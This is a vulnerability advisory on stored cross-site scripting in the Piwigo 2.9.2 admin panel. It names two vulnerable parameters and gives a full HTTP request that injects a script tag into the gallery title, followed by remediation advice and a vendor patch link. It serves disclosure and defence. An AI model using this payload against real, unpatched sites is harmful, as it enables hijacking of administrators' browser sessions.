-----
layout: none
-----
## Stored XSS Vulnerabilities in Piwigo 2.9.2

<u>**Affected Version : <=2.9.2**</u>

<u>**Description:**</u> 

It was identified that admin panel of Piwigo application is vulnerable to multiple [Persistent Cross Site Scripting](https://www.owasp.org/index.php/SQL_Injection) vulnerabilities. An attacker can exploit these vulnerabilities to hijack client's browser along with the data stored in it.  

<u>**Vulnerable Instances**</u>:

- /admin.php?page=batch_manager&mode=unit, **[POST] tags-*[]**
- /admin.php?page=configuration&section=main, **[POST] gallery_title**



**<u>Proof of Concept:</u>**

Configuration *component*

**REQUEST**

```markdown
POST /piwigo-2.9.2/piwigo/admin.php?page=configuration&section=main HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/piwigo-2.9.2/piwigo/admin.php?page=configuration
Content-Type: application/x-www-form-urlencoded
Content-Length: 310
Cookie: pwg_id=ljmb7f4h6rsrdkv9bgotsl9ja3;
Connection: close
Upgrade-Insecure-Requests: 1

gallery_title=`</title><script>alert(document.domain)</script>`&page_banner=test+banner&order_by%5B%5D=date_available+DESC&order_by%5B%5D=file+ASC&order_by%5B%5D=id+ASC&rate_anonymous=on&allow_user_registration=on&allow_user_customization=on&week_starts_on=monday&history_guest=on&log=on&mail_theme=clear&submit=
```

**RESPONSE**

![stored xss](/assets/images/piwigo2.9.2/2.png)

<u>**Remediation:**</u>

As the application make use of MVC architecture, it is recommended to implement a middleware or centralized controller that uses **[Context Specific Filtering](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet])** which sanitizes user input before printing it to user. 

**<u>Vendor Patches:</u>**

The patch released by vendor for this issue can be found [here](https://github.com/Piwigo/Piwigo/commit/c3b4c6f7f0ddeaea492080fb8211d7b4cfedaf6f) 
